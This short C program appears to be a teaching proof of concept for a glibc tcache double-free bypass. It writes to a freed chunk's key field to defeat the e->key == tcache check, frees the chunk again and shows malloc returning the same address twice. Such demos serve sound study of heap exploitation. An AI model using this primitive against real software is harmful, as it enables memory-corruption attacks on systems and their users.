#include <stdio.h>
#include <stdlib.h>

void main()
{
	int64_t * p1 = malloc(0x30);
	fprintf(stderr,"Allocate Tcache p1: %p\n",p1);
	fprintf(stderr,"Free p1\n");
	free(p1);
	fprintf(stderr,"There is Key(tcache_perthread_struct) in bk: %p\n",p1[1]);
	fprintf(stderr,"=============================================\n");
	p1[1] = 0xDEADBEEF;
	fprintf(stderr,"Changed Key value: %p\n",p1[1]);
	fprintf(stderr,"We bypassed if (__glibc_unlikely (e->key == tcache))\n");
	fprintf(stderr,"Free p1\n");
	free(p1);
	fprintf(stderr,"We can allocate same place one: %p two: %p \n",malloc(0x30),malloc(0x30));
}